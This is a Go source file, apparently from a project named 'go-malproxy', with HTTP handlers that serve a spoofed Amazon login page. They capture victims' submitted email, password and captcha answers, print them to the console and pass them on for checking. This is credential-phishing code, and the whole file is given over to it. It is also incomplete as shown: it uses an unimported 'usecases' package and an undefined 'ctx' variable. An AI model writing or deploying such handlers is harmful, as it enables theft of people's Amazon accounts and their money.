package handler

import (
	"fmt"
	"net/http"

	"github.com/go-malproxy/server/templates"
)

func AmazonLoginHandler(w http.ResponseWriter, r *http.Request) {
	templates.Executor.ExecuteTemplate(w, "amazon-login", nil)
}

func AmazonHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Println("method  :", r.Method)
	fmt.Println("email   :", r.FormValue("email"))
	fmt.Println("password:", r.FormValue("password"))
	email := r.FormValue("email")
	password := r.FormValue("password")
	ctxAmaInfo, err := usecases.CheckingTheIntegrityOfAmazonInformation(ctx, email, password)
	if err != nil {
		templates.Executor.ExecuteTemplate(w, "err", nil)
	}
	ctx = ctxAmaInfo
	templates.Executor.ExecuteTemplate(w, "autogen_amazon_info", nil)
}

func AmazonCaptchaInfo(w http.ResponseWriter, r *http.Request) {
	fmt.Println("Amazon Captcha")
	fmt.Println("method  :", r.Method)
	fmt.Println("password:", r.FormValue("catpchapass"))
	fmt.Println("guess   :", r.FormValue("guess"))
	password := r.FormValue("catpchapass")
	guess := r.FormValue("guess")
	ctxAmaCap, err := usecases.CheckingTheIntegrityOfAmazonCaptcha(ctx, password, guess)
	if err != nil {
		templates.Executor.ExecuteTemplate(w, "err", nil)
	}
	ctx = ctxAmaCap
	templates.Executor.ExecuteTemplate(w, "autogen_amazon_captcha", nil)
}
